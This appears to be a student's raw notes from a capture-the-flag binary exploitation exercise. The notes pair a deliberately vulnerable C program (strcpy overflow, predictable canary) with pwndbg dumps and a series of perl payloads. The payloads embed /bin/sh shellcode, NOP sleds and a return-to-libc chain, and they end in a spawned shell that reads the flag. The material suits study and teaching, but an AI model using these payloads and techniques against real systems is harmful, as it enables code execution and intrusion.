@@ -1,0 +1,384 @@
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+
+typedef struct{
+	char buf[76];
+	char canary[8];
+} st_t;
+
+char canary[8];
+
+int vuln(char* str, char* c){
+	st_t st = {
+		.buf = "",
+		.canary = ""
+	};
+	strcpy(st.canary,c);
+
+	strcpy(st.buf,str);
+
+
+	if(strncmp(canary,st.canary,8) == 0)
+	{
+		printf("Nice, Kenny is alive: %s", st.buf);
+		return 0;
+	}
+	else
+	{
+		printf("Oh no! you killed Kenny!\n");
+		exit(1);
+	}
+}
+
+
+int main(int argc, char **argv){
+        if (argc < 2){
+                printf("missing parameters...");
+                return -1;
+        }
+
+        srand((time(0)/10)%3+1);
+
+        sprintf(canary,"%d",rand());
+
+        canary[8] = '\0';
+
+        vuln(argv[1],canary);
+        return 0;
+}
+
+
+===============================================================================
+
+
+pwndbg> disassemble main
+Dump of assembler code for function main:
+   0x0804862a <+0>:	lea    ecx,[esp+0x4]
+   0x0804862e <+4>:	and    esp,0xfffffff0
+   0x08048631 <+7>:	push   DWORD PTR [ecx-0x4]
+   0x08048634 <+10>:	push   ebp
+   0x08048635 <+11>:	mov    ebp,esp
+   0x08048637 <+13>:	push   ebx
+   0x08048638 <+14>:	push   ecx
+   0x08048639 <+15>:	mov    ebx,ecx
+   0x0804863b <+17>:	cmp    DWORD PTR [ebx],0x1
+   0x0804863e <+20>:	jg     0x804865a <main+48>
+   0x08048640 <+22>:	sub    esp,0xc
+   0x08048643 <+25>:	push   0x8048834
+   0x08048648 <+30>:	call   0x80483e0 <printf@plt>
+   0x0804864d <+35>:	add    esp,0x10
+   0x08048650 <+38>:	mov    eax,0xffffffff
+   0x08048655 <+43>:	jmp    0x80486e7 <main+189>
+   0x0804865a <+48>:	sub    esp,0xc
+   0x0804865d <+51>:	push   0x0
+   0x0804865f <+53>:	call   0x80483f0 <time@plt>
+   0x08048664 <+58>:	add    esp,0x10
+   0x08048667 <+61>:	mov    ecx,eax
+   0x08048669 <+63>:	mov    edx,0x66666667
+   0x0804866e <+68>:	mov    eax,ecx
+   0x08048670 <+70>:	imul   edx
+   0x08048672 <+72>:	sar    edx,0x2
+   0x08048675 <+75>:	mov    eax,ecx
+   0x08048677 <+77>:	sar    eax,0x1f
+   0x0804867a <+80>:	mov    ecx,edx
+   0x0804867c <+82>:	sub    ecx,eax
+   0x0804867e <+84>:	mov    edx,0x55555556
+   0x08048683 <+89>:	mov    eax,ecx
+   0x08048685 <+91>:	imul   edx
+   0x08048687 <+93>:	mov    eax,ecx
+   0x08048689 <+95>:	sar    eax,0x1f
+   0x0804868c <+98>:	sub    edx,eax
+   0x0804868e <+100>:	mov    eax,edx
+   0x08048690 <+102>:	add    eax,eax
+   0x08048692 <+104>:	add    eax,edx
+   0x08048694 <+106>:	sub    ecx,eax
+   0x08048696 <+108>:	mov    edx,ecx
+   0x08048698 <+110>:	lea    eax,[edx+0x1]
+   0x0804869b <+113>:	sub    esp,0xc
+   0x0804869e <+116>:	push   eax
+   0x0804869f <+117>:	call   0x8048430 <srand@plt>
+   0x080486a4 <+122>:	add    esp,0x10
+   0x080486a7 <+125>:	call   0x8048450 <rand@plt>
+   0x080486ac <+130>:	sub    esp,0x4
+   0x080486af <+133>:	push   eax
+   0x080486b0 <+134>:	push   0x804884a
+   0x080486b5 <+139>:	push   0x804a040
+   0x080486ba <+144>:	call   0x8048460 <sprintf@plt>
+   0x080486bf <+149>:	add    esp,0x10
+   0x080486c2 <+152>:	mov    BYTE PTR ds:0x804a048,0x0
+   0x080486c9 <+159>:	mov    eax,DWORD PTR [ebx+0x4]
+   0x080486cc <+162>:	add    eax,0x4
+   0x080486cf <+165>:	mov    eax,DWORD PTR [eax]
+   0x080486d1 <+167>:	sub    esp,0x8
+   0x080486d4 <+170>:	push   0x804a040
+   0x080486d9 <+175>:	push   eax
+   0x080486da <+176>:	call   0x804858b <vuln>
+   0x080486df <+181>:	add    esp,0x10
+   0x080486e2 <+184>:	mov    eax,0x0
+   0x080486e7 <+189>:	lea    esp,[ebp-0x8]
+   0x080486ea <+192>:	pop    ecx
+   0x080486eb <+193>:	pop    ebx
+   0x080486ec <+194>:	pop    ebp
+   0x080486ed <+195>:	lea    esp,[ecx-0x4]
+   0x080486f0 <+198>:	ret
+End of assembler dump.
+
+pwndbg> disassemble vuln
+Dump of assembler code for function vuln:
+   0x0804858b <+0>:	push   ebp
+   0x0804858c <+1>:	mov    ebp,esp
+   0x0804858e <+3>:	push   edi
+   0x0804858f <+4>:	push   esi
+   0x08048590 <+5>:	push   ebx
+   0x08048591 <+6>:	sub    esp,0x6c                        ====================== 108bytes=====
+   0x08048594 <+9>:	lea    eax,[ebp-0x6c]                 
+   0x08048597 <+12>:	mov    ebx,0x80487e0
+   0x0804859c <+17>:	mov    edx,0x15
+   0x080485a1 <+22>:	mov    edi,eax
+   0x080485a3 <+24>:	mov    esi,ebx
+   0x080485a5 <+26>:	mov    ecx,edx
+   0x080485a7 <+28>:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
+   0x080485a9 <+30>:	sub    esp,0x8
+   0x080485ac <+33>:	push   DWORD PTR [ebp+0xc]
+   0x080485af <+36>:	lea    eax,[ebp-0x6c]
+   0x080485b2 <+39>:	add    eax,0x4c
+   0x080485b5 <+42>:	push   eax
+   0x080485b6 <+43>:	call   0x8048400 <strcpy@plt>
+   0x080485bb <+48>:	add    esp,0x10
+   0x080485be <+51>:	sub    esp,0x8
+   0x080485c1 <+54>:	push   DWORD PTR [ebp+0x8]
+   0x080485c4 <+57>:	lea    eax,[ebp-0x6c]
+   0x080485c7 <+60>:	push   eax
+   0x080485c8 <+61>:	call   0x8048400 <strcpy@plt>
+   0x080485cd <+66>:	add    esp,0x10
+   0x080485d0 <+69>:	sub    esp,0x4
+   0x080485d3 <+72>:	push   0x8
+   0x080485d5 <+74>:	lea    eax,[ebp-0x6c]
+   0x080485d8 <+77>:	add    eax,0x4c
+   0x080485db <+80>:	push   eax
+   0x080485dc <+81>:	push   0x804a040
+   0x080485e1 <+86>:	call   0x8048470 <strncmp@plt>      ==============compara==========
+   0x080485e6 <+91>:	add    esp,0x10
+   0x080485e9 <+94>:	test   eax,eax
+   0x080485eb <+96>:	jne    0x8048608 <vuln+125>
+   0x080485ed <+98>:	sub    esp,0x8
+   0x080485f0 <+101>:	lea    eax,[ebp-0x6c]
+   0x080485f3 <+104>:	push   eax
+   0x080485f4 <+105>:	push   0x80487a0
+   0x080485f9 <+110>:	call   0x80483e0 <printf@plt>
+   0x080485fe <+115>:	add    esp,0x10
+   0x08048601 <+118>:	mov    eax,0x0
+   0x08048606 <+123>:	jmp    0x8048622 <vuln+151>
+   0x08048608 <+125>:	sub    esp,0xc
+   0x0804860b <+128>:	push   0x80487b9
+   0x08048610 <+133>:	call   0x8048410 <puts@plt>
+   0x08048615 <+138>:	add    esp,0x10
+   0x08048618 <+141>:	sub    esp,0xc
+   0x0804861b <+144>:	push   0x1
+   0x0804861d <+146>:	call   0x8048420 <exit@plt>
+   0x08048622 <+151>:	lea    esp,[ebp-0xc]
+   0x08048625 <+154>:	pop    ebx
+   0x08048626 <+155>:	pop    esi
+   0x08048627 <+156>:	pop    edi
+   0x08048628 <+157>:	pop    ebp
+   0x08048629 <+158>:	ret
+End of assembler dump.
+
+>>>r $(perl -e 'print "A"x76 . "BBBBBBBB" ' )
+ ► 0x80485e1 <vuln+86>     call   strncmp@plt <0x8048470>
+        s1: 0x804a040 (canary) ◂— '18042893'
+        s2: 0xffffc4e8 ◂— 'BBBBBBBB'
+        n: 0x8
+>>>
+Starting program: /home/m918111/mission3/mission3 $(perl -e 'print "A"x76 . "18042893" . "BBBBCCCC" . "EEEEFFFFGGGGHHHHLLLLMMMM"' )
+
+Breakpoint 1, 0x080485e1 in vuln ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+───────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────
+ EAX  0xffffc4c8 ◂— '18042893BBBBCCCCEEEEFFFFGGGGHHHHLLLLMMMM'
+ EBX  0x80487e0 ◂— add    byte ptr [eax], al
+ ECX  0xffffc790 ◂— 0x58004d4d /* 'MM' */
+ EDX  0xffffc4ee ◂— 0xc7004d4d /* 'MM' */
+ EDI  0xffffc4d0 ◂— 'BBBBCCCCEEEEFFFFGGGGHHHHLLLLMMMM'
+ ESI  0x8048834 ◂— insd   dword ptr es:[edi], dx /* 'missing parameters...' */
+ EBP  0xffffc4e8 ◂— 'LLLLMMMM'
+ ESP  0xffffc460 —▸ 0x804a040 (canary) ◂— '18042893'
+ EIP  0x80485e1 (vuln+86) —▸ 0xfffe8ae8 ◂— 0x0
+─────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────
+ ► 0x80485e1 <vuln+86>     call   strncmp@plt <0x8048470>
+        s1: 0x804a040 (canary) ◂— '18042893'
+        s2: 0xffffc4c8 ◂— '18042893BBBBCCCCEEEEFFFFGGGGHHHHLLLLMMMM'
+        n: 0x8
+
+   0x80485e6 <vuln+91>     add    esp, 0x10
+   0x80485e9 <vuln+94>     test   eax, eax
+   0x80485eb <vuln+96>     jne    vuln+125 <0x8048608>
+
+   0x80485ed <vuln+98>     sub    esp, 8
+   0x80485f0 <vuln+101>    lea    eax, [ebp - 0x6c]
+   0x80485f3 <vuln+104>    push   eax
+   0x80485f4 <vuln+105>    push   0x80487a0
+   0x80485f9 <vuln+110>    call   printf@plt <0x80483e0>
+
+   0x80485fe <vuln+115>    add    esp, 0x10
+   0x8048601 <vuln+118>    mov    eax, 0
+─────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
+00:0000│ esp  0xffffc460 —▸ 0x804a040 (canary) ◂— '18042893'
+01:0004│      0xffffc464 —▸ 0xffffc4c8 ◂— '18042893BBBBCCCCEEEEFFFFGGGGHHHHLLLLMMMM'
+02:0008│      0xffffc468 ◂— 0x8
+03:000c│      0xffffc46c —▸ 0xf7ffd918 ◂— 0x0
+04:0010│      0xffffc470 —▸ 0x804a02c (_GLOBAL_OFFSET_TABLE_+44) —▸ 0xf7e5f6d0 (sprintf) ◂— sub    esp, 0xc
+05:0014│      0xffffc474 —▸ 0xf7fe78a2 (_dl_fixup+194) ◂— mov    edi, eax
+06:0018│      0xffffc478 ◂— 0xffffffff
+07:001c│      0xffffc47c ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA18042893BBBBCCCCEEEEFFFFGGGGHHHHLLLLMMMM'
+───────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
+ ► f 0  80485e1 vuln+86
+   f 1 4d4d4d4d
+Breakpoint *0x80485e1
+pwndbg> c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x4d4d4d4d in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+───────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────
+ EAX  0x0
+ EBX  0x46464646 ('FFFF')
+ ECX  0x7fffff75
+ EDX  0xf7fc9870 (_IO_stdfile_1_lock) ◂— 0x0
+ EDI  0x48484848 ('HHHH')
+ ESI  0x47474747 ('GGGG')
+ EBP  0x4c4c4c4c ('LLLL')
+ ESP  0xffffc4f0 —▸ 0xffffc700 ◂— 'ome/m918111/mission3/mission3'
+ EIP  0x4d4d4d4d ('MMMM')
+─────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────
+Invalid address 0x4d4d4d4d
+
+
+
+
+
+
+
+
+
+
+─────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
+00:0000│ esp  0xffffc4f0 —▸ 0xffffc700 ◂— 'ome/m918111/mission3/mission3'
+01:0004│      0xffffc4f4 —▸ 0x804a040 (canary) ◂— '18042893'
+02:0008│      0xffffc4f8 ◂— 0x6b8b4567
+03:000c│      0xffffc4fc —▸ 0x80486ac (main+130) ◂— sub    esp, 4
+04:0010│      0xffffc500 —▸ 0xffffc520 ◂— 0x2
+05:0014│      0xffffc504 ◂— 0x0
+... ↓
+07:001c│      0xffffc50c —▸ 0xf7e2e637 (__libc_start_main+247) ◂— add    esp, 0x10
+───────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
+ ► f 0 4d4d4d4d
+Program received signal SIGSEGV (fault address 0x4d4d4d4d)
+pwndbg>
+
+r $(perl -e 'print "A"x56 . "\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" . "18042893" . "\x90"x24 . "EEEE"x2' )
+
+pwndbg> x/100x $esp-100
+0xffffc48c:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffc49c:	0x41414141	0x41414141	0x41414141	0x41414141
+
+0xffffc4ac:	0x41414141	0x41414141	0x0b6ac931	0x2f685158
+0xffffc4bc:	0x6868732f	0x6e69622f	0x80cde389	0x34303831
+0xffffc4cc:	0x33393832	0x90909090	0x90909090	0x90909090
+0xffffc4dc:	0x90909090	0x90909090	0x90909090	0x45454545
+0xffffc4ec:	0x45454545	0xffffc700	0x0804a040	0x6b8b4567
+
+0xffffc4fc:	0x080486ac	0xffffc520	0x00000000	0x00000000
+0xffffc50c:	0xf7e2e637	0xf7fc8000	0xf7fc8000	0x00000000
+0xffffc51c:	0xf7e2e637	0x00000002	0xffffc5b4	0xffffc5c0
+0xffffc52c:	0x00000000	0x00000000	0x00000000	0xf7fc8000
+0xffffc53c:	0xf7ffdc04	0xf7ffd000	0x00000000	0xf7fc8000
+0xffffc54c:	0xf7fc8000	0x00000000	0xa313210e	0x99528f1e
+0xffffc55c:	0x00000000	0x00000000	0x00000000	0x00000002
+0xffffc56c:	0x08048490	0x00000000	0xf7fee010	0xf7fe8880
+0xffffc57c:	0xf7ffd000	0x00000002	0x08048490	0x00000000
+0xffffc58c:	0x080484b1	0x0804862a	0x00000002	0xffffc5b4
+0xffffc59c:	0x08048700	0x08048760	0xf7fe8880	0xffffc5ac
+0xffffc5ac:	0xf7ffd918	0x00000002	0xffffc6fe	0xffffc71e
+0xffffc5bc:	0x00000000	0xffffc793	0xffffc7a9	0xffffc7b9
+0xffffc5cc:	0xffffc7cd	0xffffd7d7	0xffffd7f7	0xffffd80a
+0xffffc5dc:	0xffffd817	0xffffdd9f	0xffffddab	0xffffde3e
+0xffffc5ec:	0xffffde55	0xffffde64	0xffffde7f	0xffffde90
+0xffffc5fc:	0xffffde99	0xffffdeac	0xffffdeb4	0xffffdec6
+0xffffc60c:	0xffffdee0	0xffffdef0	0xffffdf23	0xffffdf64
+
+
+r $(perl -e 'print "\x90"x48 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" . "18042893" . "\x90"x24 . "\x8c\xc4\xff\xff"x2' )
+
+xxxxx 发现不可执行，利用return to lib
+
+EIP ====system()
+EIP-1 =====exit
+
+
+
+1.把/bin/sh放入BIN_SH中  并通过 getenv(）函数获得其大致地址 0xbffffe1c。但实际字符串 "/bin/sh" 的地址还需要进一步确认。
+
+gleonardo@GLeonardodeMBP ~ % export BIN_SH="/bin/sh"
+gleonardo@GLeonardodeMBP ~ % echo $BIN_SH
+/bin/sh
+
+
+
+
+2.用 GDB 获取 system()和 exit()的入口地址。
+
+pwndbg> p system
+$1 = {<text variable, no debug info>} 0xf7e50da0 <__libc_system>
+pwndbg> p exit
+$2 = {<text variable, no debug info>} 0xf7e449d0 <__GI_exit>
+
+
+
+发现无法写入程序vim 无法利用getenv
+
+自己写
+
+r $(perl -e 'print "A"x68 . "/bash/sh" . "18042893" . "B"x24 . "\xa0\x0d\xe5\xf7"x2 . "/bash/sh" . "\xd0\x49\xe4\xf7" ' )
+
+0xffffc45c:	0xf7ffd918	0x0804a02c	0xf7fe78a2	0xffffffff
+0xffffc46c:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffc47c:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffc48c:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffc49c:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffc4ac:	0x41414141	0x7361622f	0x68732f68	0x34303831
+0xffffc4bc:	0x33393832	0x42424242	0x42424242	0x42424242
+
+r $(perl -e 'print "A"x68 . "/bash/sh" . "18042893" . "B"x24 . "\xa0\x0d\xe5\xf7"x2 . "/x9c/xc4/xff/xff" . "\xd0\x49\xe4\xf7" ' )
+
+$(perl -e 'print "A"x68 . "/bash/sh" . "18042893" . "B"x24 . "\xa0\x0d\xe5\xf7"x2 . "\xb0\xc4\xff\xff" . "\xd0\x49\xe4\xf7" ' )
+
+r $(perl -e 'print "A"x64 . "/bash/sh" . "\xd0\x49\xe4\xf7" . "18042893" . "B"x24 . "\xa0\x0d\xe5\xf7"x2 . "\xb0\xc4\xff\xff" ' )
+
+r $(perl -e 'print "A"x68 . "/bash/sh" . "18042893" . "B"x24 . "\xa0\x0d\xe5\xf7"x2 . "\xb0\xc4\xff\xff" ' )
+
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
+
+r $(perl -e 'print "\x90"x48 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" . "18042893" . "\x90"x24 . "\xa0\x0d\xe5\xf7"x2 . "\xb0\xc4\xff\xff" ' )
+
+
+
+=======================================
+
+
+
+0xffffdee0:	"BATH_SH=/bin/sh"
+
+####export SHELLCODE55=`python2 -c 'print "\x90"*100 + "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x58\x58\x58\x58\x59\x59\x59\x59"'`
+
+###0xffffdde1:	"SHELLCODE55=", '\220' <repeats 100 times>, "\061\300\260F1\333\061\311̀\353\026[1\300\210C\a\211[\b\211C\f\260\v\215K\b\215S\f̀\350\345\377\377\377/bin/shNXXXXYYYY"
+
+
+m918111@bin:~/mission3$ ./mission3 $(perl -e 'print "A"x76 . "18042893" . "B"x24 . "\xa0\x0d\xe5\xf7"x2 . "\xd0\x49\xe4\xf7"  . "\xe0\xde\xff\xff" ' )
+$ cat flag
+aKCtSfFVLlALulDUXKZs$
